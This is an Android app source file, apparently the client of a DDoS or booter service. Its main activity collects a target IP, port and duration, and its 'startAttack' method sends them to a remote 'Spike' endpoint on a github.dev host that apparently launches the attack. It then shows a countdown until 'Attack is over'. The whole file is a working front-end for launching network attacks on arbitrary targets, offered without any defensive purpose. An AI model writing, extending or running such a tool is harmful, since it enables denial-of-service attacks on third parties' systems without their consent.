package soul.cracks.com;

import android.os.Bundle;
import android.os.CountDownTimer;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    private EditText ipInput, portInput, timeInput;
    private Button startButton;
    private TextView statusText;
    private OkHttpClient client = new OkHttpClient();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        ipInput = findViewById(R.id.ipInput);
        portInput = findViewById(R.id.portInput);
        timeInput = findViewById(R.id.timeInput);
        startButton = findViewById(R.id.startButton);
        statusText = findViewById(R.id.statusText);


        startButton.setOnClickListener(v -> startAttack());
    }

    private void startAttack() {

        String ip = ipInput.getText().toString();
        int port = Integer.parseInt(portInput.getText().toString());
        int time = Integer.parseInt(timeInput.getText().toString());

        if (ip.isEmpty() || port == 0 || time == 0) {
            Toast.makeText(this, "Please enter valid IP, Port, and Time", Toast.LENGTH_SHORT).show();
            return;
        }

        statusText.setText("Attack started\nIP: " + ip + "\nPort: " + port + "\nTime: " + time + " seconds");


        sendAttackDataToServer(ip, port, time);


        new CountDownTimer(time * 1000, 1000) {

            public void onTick(long millisUntilFinished) {
                statusText.setText("Time remaining: " + millisUntilFinished / 1000 + " seconds");
            }

            public void onFinish() {
                statusText.setText("Attack is over\nIP: " + ip + "\nPort: " + port + "\nTime: " + time + " seconds");
            }

        }.start();
    }

    private void sendAttackDataToServer(String ip, int port, int time) {

        String url = "https://probable-adventure-5g7p4pp54p6366w.github.dev/Spike?ip=" + ip + "&port=" + port + "&time=" + time;

        Request request = new Request.Builder()
                .url(url)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

                e.printStackTrace();
                runOnUiThread(() -> {
                    Toast.makeText(MainActivity.this, "Failed to send data to server: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                    statusText.setText("Error: " + e.getMessage());
                });
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    String responseData = response.body().string();
                    runOnUiThread(() -> {
                        Toast.makeText(MainActivity.this, "Success: " + responseData, Toast.LENGTH_SHORT).show();
                        statusText.setText("Response: " + responseData);
                    });
                } else {
                    runOnUiThread(() -> {
                        Toast.makeText(MainActivity.this, "Server Error: " + response.code(), Toast.LENGTH_SHORT).show();
                        statusText.setText("Server returned an error: " + response.code());
                    });
                }
            }
        });
    }
}
